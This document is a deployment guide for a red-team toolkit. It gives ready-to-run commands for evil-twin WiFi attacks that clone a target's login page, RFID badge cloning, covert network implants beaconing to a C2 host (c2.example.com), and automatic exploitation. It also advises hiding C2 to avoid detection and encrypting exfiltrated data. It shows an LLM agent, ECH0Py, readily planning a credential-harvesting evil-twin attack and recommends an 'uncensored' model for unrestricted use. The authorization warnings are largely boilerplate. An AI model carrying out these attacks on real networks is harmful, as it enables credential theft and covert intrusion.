# Sovereign Security Toolkit - Complete Deployment Guide
**Copyright (c) 2025 Joshua Hendricks Cole (DBA: Corporation of Light). All Rights Reserved. PATENT PENDING.**

## ⚠️ AUTHORIZATION WARNING

**ALL TOOLS IN THIS TOOLKIT ARE FOR AUTHORIZED PENETRATION TESTING AND SECURITY TRAINING ONLY.**

Unauthorized use is **ILLEGAL** and may result in:
- Federal criminal charges
- Civil liability
- Imprisonment
- Significant fines

Always obtain written authorization before deployment.

---

## Table of Contents

1. [Overview](#overview)
2. [Quick Start](#quick-start)
3. [Docker Deployment](#docker-deployment)
4. [Raspberry Pi Deployment](#raspberry-pi-deployment)
5. [Individual Tool Setup](#individual-tool-setup)
6. [Authorization Setup](#authorization-setup)
7. [Integration with Ai:oS](#integration-with-aios)
8. [Troubleshooting](#troubleshooting)

---

## Overview

The Sovereign Security Toolkit is a comprehensive red team arsenal featuring:

### Core Tools

- **PyThief**: Evil twin WiFi attack framework with Bluetooth control, WiFi Marauder, and SDR support
- **Hak5 Arsenal**: Reverse-engineered USB Shark, Packet Squirrel, LAN Turtle
- **WiFi Coconut**: 14-radio simultaneous WiFi monitoring and analysis
- **Proxmark3 Toolkit**: RFID/NFC/EMV security testing with badge cloning
- **Pwnie Revival**: Modern Pwnie Express tools (Pwn Plug, Pwn Pro, Pwn Pad, Pwn Pulse)
- **gPIG**: Intelligent network reconnaissance with auto-exploitation
- **ECH0Py**: Lightweight LLM agent for tool orchestration (Raspberry Pi optimized)

### Legacy Toolkit

- **AuroraScan**: Network reconnaissance
- **CipherSpear**: Database security assessment
- **SkyBreaker**: Wireless auditing
- **MythicKey**: Password analysis and cracking
- **SpectraTrace**: Packet inspection
- **NemesisHydra**: Authentication testing
- **ObsidianHunt**: Host hardening audit
- **VectorFlux**: Payload staging

---

## Quick Start

### Prerequisites

- Linux system (Kali Linux, Ubuntu, Arch) or macOS
- Root/sudo access
- Python 3.8+
- Docker (for containerized deployment)

### Installation

```bash
# Clone repository
cd /Users/noone/aios/tools

# Install Python dependencies
pip3 install -r requirements_pythief.txt

# Verify installation
python3 -c "from tools import health_check_all; import json; print(json.dumps(health_check_all(), indent=2))"
```

---

## Docker Deployment

### Build PyThief Red Team Image

```bash
cd /Users/noone/aios/tools

# Make build script executable
chmod +x build_pythief_image.sh

# Build Docker image
./build_pythief_image.sh
```

### Run PyThief Container

```bash
# Basic evil twin attack
docker run --rm -it --privileged --network host pythief-redteam:latest \
  python3 /opt/pythief/pythief.py \
  --ssid "Free WiFi" \
  --company "Acme Corp" \
  --auth-token YOUR_TOKEN \
  --engagement-id ENG-001

# With custom login page cloning
docker run --rm -it --privileged --network host pythief-redteam:latest \
  python3 /opt/pythief/pythief.py \
  --ssid "Corporate WiFi" \
  --target-url https://login.target.com \
  --company "Target Corp" \
  --auth-token YOUR_TOKEN \
  --engagement-id ENG-001

# USB Shark mode (requires USB device passthrough)
docker run --rm -it --privileged \
  -v /dev/bus/usb:/dev/bus/usb \
  pythief-redteam:latest \
  python3 /opt/pythief/hak5_arsenal.py usb-shark

# WiFi Coconut (14 radios)
docker run --rm -it --privileged --network host pythief-redteam:latest \
  python3 /opt/pythief/wifi_coconut.py \
  --num-radios 14 \
  --duration 300 \
  --channels 1 6 11

# Interactive shell
docker run --rm -it --privileged --network host pythief-redteam:latest /bin/bash
```

---

## Raspberry Pi Deployment

### Hardware Requirements

- **Raspberry Pi 4** (4GB RAM minimum, 8GB recommended)
- **Storage**: 32GB microSD card minimum, 128GB recommended
- **WiFi Adapter**: External USB WiFi adapter for monitor mode (Alfa AWUS036ACH recommended)
- **Optional**:
  - Proxmark3 Easy (for RFID/NFC)
  - ESP32 with Marauder firmware (for advanced WiFi attacks)
  - RTL-SDR or HackRF (for SDR capabilities)

### Operating System

**Recommended**: Kali Linux ARM or Ubuntu Server ARM

```bash
# Download Kali ARM for Raspberry Pi 4
# https://www.kali.org/get-kali/#kali-arm

# Flash to microSD card
dd if=kali-linux-2025.1-raspberry-pi-arm64.img of=/dev/sdX bs=4M status=progress
```

### ECH0Py LLM Agent Setup

ECH0Py is a lightweight LLM agent optimized for Raspberry Pi 4 that can intelligently operate all pentesting tools.

#### Recommended Models for Pi 4 (4GB RAM)

1. **Phi-2** (2.7B parameters) - **RECOMMENDED**
   - Best quality/size ratio
   - Fast inference (~5-10 tokens/sec on Pi 4)
   - Good pentesting knowledge

2. **TinyLlama** (1.1B parameters)
   - Fastest option (~15-20 tokens/sec)
   - Smaller knowledge base

3. **Dolphin-Phi-2** - **UNCENSORED** version of Phi-2
   - Best for unrestricted pentesting discussions

#### Installation

```bash
# Install ECH0Py
cd /Users/noone/aios/tools
pip3 install transformers torch llama-cpp-python

# Download model (choose one)

# Option 1: Using Ollama (easiest)
curl -fsSL https://ollama.com/install.sh | sh
ollama pull phi-2

# Option 2: Download GGUF model for llama.cpp
python3 ech0py_agent.py --model phi-2 --backend llama_cpp --download

# Option 3: Use HuggingFace Transformers
python3 ech0py_agent.py --model phi-2 --backend transformers
```

#### Running ECH0Py

```bash
# Interactive mode
python3 ech0py_agent.py --model phi-2 --backend ollama

# Single prompt
python3 ech0py_agent.py --model phi-2 --prompt "Scan network 192.168.1.0/24 for vulnerabilities"

# Run tool directly through ECH0Py
python3 ech0py_agent.py --run-tool pythief --tool-args --ssid "Test" --health
```

#### ECH0Py Example Session

```
You: I need to perform an evil twin attack on SSID "CorporateWiFi" and clone their login page from https://portal.corp.com

ECH0Py: I'll set up an evil twin attack for you. Here's what I'll do:

1. Clone the login page from https://portal.corp.com
2. Set up hostapd with SSID "CorporateWiFi"
3. Configure dnsmasq for DHCP and DNS spoofing
4. Start packet capture
5. Launch the evil twin with the cloned page

To execute this, I'll use PyThief with these parameters:
--ssid "CorporateWiFi"
--target-url https://portal.corp.com
--company "Corporate"

Would you like me to proceed? (Remember: authorization required!)

You: /run pythief --ssid "CorporateWiFi" --target-url https://portal.corp.com --health

ECH0Py: Running health check first...
[Output from PyThief health check]

Everything looks good. Ready to proceed with the attack.
```

---

## Individual Tool Setup

### PyThief

```bash
# Setup authorization
python3 pythief.py --setup-auth

# Edit authorization file
nano ~/.pythief/authorization.json

# Run evil twin
python3 pythief.py \
  --ssid "Free WiFi" \
  --company "Guest Network" \
  --interface wlan0 \
  --auth-token YOUR_TOKEN \
  --engagement-id ENG-001

# With WiFi Marauder
python3 pythief.py \
  --ssid "Corp WiFi" \
  --marauder \
  --marauder-device /dev/ttyUSB0 \
  --auth-token YOUR_TOKEN \
  --engagement-id ENG-001

# With SDR support
python3 pythief.py \
  --ssid "Test WiFi" \
  --sdr \
  --sdr-device rtlsdr \
  --auth-token YOUR_TOKEN \
  --engagement-id ENG-001
```

### WiFi Coconut

```bash
# Auto-detect radios and scan all channels
python3 wifi_coconut.py --num-radios 14 --duration 600

# Manual channel selection
python3 wifi_coconut.py --channels 1 6 11 36 40 44 48 --duration 300

# Disable channel hopping
python3 wifi_coconut.py --no-hopping --duration 300

# Analyze captured packets
python3 wifi_coconut.py --analyze

# Show antenna overlay
python3 wifi_coconut.py --overlay
```

### Proxmark3 Toolkit

```bash
# Auto-detect Proxmark3
python3 proxmark3_toolkit.py --health

# Search for LF (125kHz) cards
python3 proxmark3_toolkit.py --lf-search

# Search for HF (13.56MHz) cards
python3 proxmark3_toolkit.py --hf-search

# Read NFC card
python3 proxmark3_toolkit.py --nfc-read

# Clone card by UID
python3 proxmark3_toolkit.py --clone EM410X_UID_HERE

# Emulate card
python3 proxmark3_toolkit.py --emulate HID_UID_HERE --duration 120

# Read EMV card (educational only)
python3 proxmark3_toolkit.py --emv-read

# List saved cards
python3 proxmark3_toolkit.py --list-cards
```

### Hak5 Arsenal

```bash
# Download official Hak5 payloads
python3 hak5_arsenal.py download-payloads

# USB Shark mode
python3 hak5_arsenal.py usb-shark --engagement-id ENG-001

# Packet Squirrel mode
python3 hak5_arsenal.py packet-squirrel --interface eth0

# LAN Turtle mode with C2
python3 hak5_arsenal.py lan-turtle --c2 https://c2.example.com --engagement-id ENG-001
```

### Pwnie Revival

```bash
# Pwn Plug (covert network implant)
python3 pwnie_revival.py pwn-plug \
  --c2 https://c2.example.com \
  --c2-protocol https \
  --engagement-id ENG-001

# Pwn Pro (full security assessment)
python3 pwnie_revival.py pwn-pro --interface eth0

# Pwn Pulse (enterprise assessment)
python3 pwnie_revival.py pwn-pulse --json > assessment_results.json
```

### gPIG

```bash
# Full reconnaissance with web interface
python3 gpig.py --interface eth0 --port 5555

# Reconnaissance only (no web interface)
python3 gpig.py --interface eth0 --no-web --json > network_map.json

# Auto-exploit discovered targets
python3 gpig.py --interface eth0 --auto-exploit

# With quantum API integration
python3 gpig.py --interface eth0 --api-key YOUR_AIOS_API_KEY --auto-exploit
```

Then open browser to `http://localhost:5555` to see the network overlay.

---

## Authorization Setup

### Creating Authorization File

All tools require explicit authorization. Create the authorization file:

```bash
# For PyThief
python3 pythief.py --setup-auth

# This creates: ~/.pythief/authorization.json
```

### Authorization File Format

```json
{
  "engagements": [
    {
      "id": "TRAINING-001",
      "token": "sha256_hash_of_your_secure_token",
      "scope": "Internal security training - WiFi attacks authorized",
      "created": "2025-10-30T00:00:00Z",
      "expires": "2025-11-30T00:00:00Z",
      "authorized_by": "Security Manager Name",
      "targets": ["192.168.1.0/24", "testnetwork.local"]
    },
    {
      "id": "PENTEST-042",
      "token": "another_sha256_hash",
      "scope": "External penetration test - full network access",
      "created": "2025-10-30T00:00:00Z",
      "expires": "2025-11-15T00:00:00Z",
      "authorized_by": "Client CISO",
      "targets": ["10.0.0.0/8"]
    }
  ]
}
```

### Generating Authorization Token

```python
import hashlib
import secrets

# Generate secure token
token = secrets.token_urlsafe(32)
token_hash = hashlib.sha256(token.encode()).hexdigest()

print(f"Token: {token}")
print(f"Hash for authorization.json: {token_hash}")

# Save token securely - you'll use it with --auth-token
```

---

## Integration with Ai:oS

### Register Tools in Ai:oS Manifest

Edit `/Users/noone/aios/config.py` and add:

```python
# Security agent actions
"security": {
    "actions": {
        "pythief": {
            "description": "Run evil twin WiFi attack",
            "critical": False
        },
        "wifi_coconut": {
            "description": "Multi-radio WiFi analysis",
            "critical": False
        },
        "gpig": {
            "description": "Network reconnaissance and auto-exploitation",
            "critical": False
        }
    }
}
```

### Using Tools from Ai:oS

```bash
# Boot Ai:oS with security tools
python aios/aios -v boot

# Execute tool via Ai:oS
python aios/aios -v exec security.pythief

# Natural language execution
python aios/aios -v prompt "scan network for vulnerabilities using gPIG"
```

---

## Troubleshooting

### Common Issues

#### 1. "No wireless interfaces found"

```bash
# Check interfaces
iwconfig
iw dev

# Enable monitor mode manually
sudo airmon-ng start wlan0
```

#### 2. "Proxmark3 not detected"

```bash
# Check USB connection
lsusb | grep -i proxmark

# Try manual port
python3 proxmark3_toolkit.py --port /dev/ttyACM0
```

#### 3. "Docker image requires --privileged"

WiFi and network operations require privileged mode:

```bash
docker run --rm -it --privileged --network host pythief-redteam:latest
```

#### 4. "Permission denied" errors

Most tools require root:

```bash
sudo python3 pythief.py --health
```

#### 5. "Out of memory" on Raspberry Pi

Reduce model size for ECH0Py:

```bash
# Use TinyLlama instead of Phi-2
python3 ech0py_agent.py --model tinyllama --backend ollama
```

### Debug Mode

Enable verbose logging:

```bash
# Set log level
export LOG_LEVEL=DEBUG

# Run tool
python3 pythief.py --health
```

---

## Security Best Practices

1. **Always obtain written authorization** before deployment
2. **Use VPN or out-of-band C2** to avoid detection
3. **Encrypt all exfiltrated data** during transmission
4. **Maintain comprehensive audit logs** of all activities
5. **Securely wipe devices** after engagement completion
6. **Never use on production systems** without explicit approval
7. **Test in isolated lab environment** first
8. **Keep authorization documentation** for legal protection

---

## Legal Disclaimer

The tools in this repository are provided for **AUTHORIZED SECURITY TESTING AND EDUCATIONAL PURPOSES ONLY**.

The developers and Corporation of Light assume NO LIABILITY for misuse of these tools. Users are solely responsible for:
- Obtaining proper authorization
- Complying with all applicable laws
- Any consequences of unauthorized use

**Unauthorized access to computer systems is ILLEGAL under:**
- Computer Fraud and Abuse Act (CFAA) - 18 U.S.C. § 1030
- Similar laws in all jurisdictions worldwide

**YOU HAVE BEEN WARNED.**

---

## Support and Updates

- **Issues**: Report bugs at [GitHub Issues](https://github.com/corporation-of-light/sovereign-security-toolkit/issues)
- **Documentation**: [Full documentation](https://docs.aios.is/security-toolkit)
- **Updates**: `git pull origin main` to update toolkit

---

## License

Copyright (c) 2025 Joshua Hendricks Cole (DBA: Corporation of Light). All Rights Reserved.

**PATENT PENDING.**

For licensing inquiries: security-toolkit@corporation-of-light.com

---

## Acknowledgments

This toolkit builds upon and improves:
- Hak5 hardware and payloads
- Pwnie Express methodologies
- WiFi Pineapple techniques
- Proxmark3 firmware
- WiFi Coconut multi-radio architecture
- Community pentesting tools

**All implementations are original, clean-room reverse engineering with significant improvements for 2025 security landscape.**

---

**Remember: With great power comes great responsibility. Use these tools ethically and legally.**
